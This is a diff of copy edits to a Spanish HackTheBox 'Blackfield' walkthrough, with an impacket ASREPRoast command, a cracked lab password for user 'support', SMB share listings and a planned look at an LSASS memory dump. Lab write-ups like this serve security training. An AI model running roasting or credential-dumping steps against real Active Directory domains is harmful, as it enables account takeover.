@@ -88,7 +88,7 @@ Encuentro una lista grande de usuarios, asique eso me da que pensar... Podría c
 
 Paso los nombres de usuario a un archivo y lanzo el ataque ASREPRoast
 
-> ` impacket-GetNPUsers -usersfile /home/elc4br4/HTB/Blackfield/users.txt -outputfile hashes.hash BLACKFIELD.local/`
+> `impacket-GetNPUsers -usersfile /home/elc4br4/HTB/Blackfield/users.txt -outputfile hashes.hash BLACKFIELD.local/`
 
 Y abro el archivo que se me genera y encuentro un hash del usuario `support`
 
@@ -102,7 +102,7 @@ A continuación voy a craquearlo usando hascat
 
 Listo, tenemos un usuario y una contraseña.
 
-> support:#00^BlackKnight
+> `support:#00^BlackKnight`
 
 Ahora que ya tengo credenciales vuelvo para atrás de nuevo para enumerar usuarios del Dominio pero a través de la herramienta enum4linux.
 
@@ -180,7 +180,7 @@ smb: \> ls
 		5102079 blocks of size 4096. 1660717 blocks available
 ```
 
-En la ruta commands_output encuentro avrios archivos.
+En la ruta commands_output encuentro varios archivos.
 
 ```smb
 smb: \commands_output\> ls
@@ -199,13 +199,13 @@ smb: \commands_output\> ls
 		5102079 blocks of size 4096. 1667267 blocks available
 ```
 
-Miro todos los archivos y en el archivo `domain_admins.txt` enceuntro un usuario más administrador del dominio.
+Miro todos los archivos y en el archivo `domain_admins.txt` encuentro un usuario más, administrador del dominio.
 
 ![](/assets/images/HTB/Blackfield-HackTheBox/doamin_admins.webp)
 
 > Ipwn3dYourCompany
 
-Sigo buscando y en la carpeta memory_analysis encuentro esto
+Sigo buscando y en la carpeta memory_analysis encuentro estos archivos .zip
 
 ```smb
 smb: \memory_analysis\> ls
@@ -231,7 +231,7 @@ smb: \memory_analysis\> ls
 		5102079 blocks of size 4096. 1682559 blocks available
 ```
 
-> Son archivos zip de un dumpeo de memoria.
+> Son archivos .zip de un dumpeo de memoria.
 
 Pero el que más me llama la atencion es el lsas.zip, lsas es el Servicio de Subsistema de Autoridad de Seguridad Local.
 
